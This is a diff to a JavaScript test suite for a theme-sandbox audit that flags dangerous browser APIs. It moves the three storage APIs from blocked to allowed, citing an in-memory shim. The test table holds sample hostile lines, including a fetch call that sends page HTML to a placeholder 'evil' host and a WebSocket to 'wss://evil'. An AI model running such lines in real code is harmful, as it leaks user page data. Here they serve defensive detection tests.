@@ -15,9 +15,6 @@ describe('主题沙箱危险 API 审计', () => {
     ['fetch()', 'fetch("https://evil/steal?c=" + document.body.innerHTML)'],
     ['XMLHttpRequest', 'new XMLHttpRequest()'],
     ['WebSocket', 'new WebSocket("wss://evil")'],
-    ['localStorage', 'localStorage.setItem("x", "y")'],
-    ['sessionStorage', 'sessionStorage.getItem("x")'],
-    ['indexedDB', 'indexedDB.open("x")'],
     ['document.cookie', 'document.cookie = "x=1"'],
     ['eval()', 'eval("alert(1)")'],
     ['new Function()', 'new Function("return 1")()'],
@@ -35,6 +32,19 @@ describe('主题沙箱危险 API 审计', () => {
       'const g = document.getElementById("themeEffectSection");' +
       'if (g) { g.style.color = "hsl(120 60% 50%)"; }';
     expect(ThemeEffects._auditThemeCode('test-theme', safe)).toBe(false);
+  });
+
+  test('存储三件套经内存垫片支持，不再被拦截', () => {
+    // 设计变更：localStorage/sessionStorage/indexedDB 通过 new Function 形参注入隔离
+    // 内存垫片，主题内部引用不再触达真实存储（安全意图不变），故审计放行而非误杀合规主题。
+    const codes = [
+      'localStorage.setItem("k", "v")',
+      'sessionStorage.getItem("k")',
+      'indexedDB.open("db")',
+    ];
+    for (const c of codes) {
+      expect(ThemeEffects._auditThemeCode('test-theme', c)).toBe(false);
+    }
   });
 
   test('注释中的危险关键词不误报（剥离注释后审计）', () => {
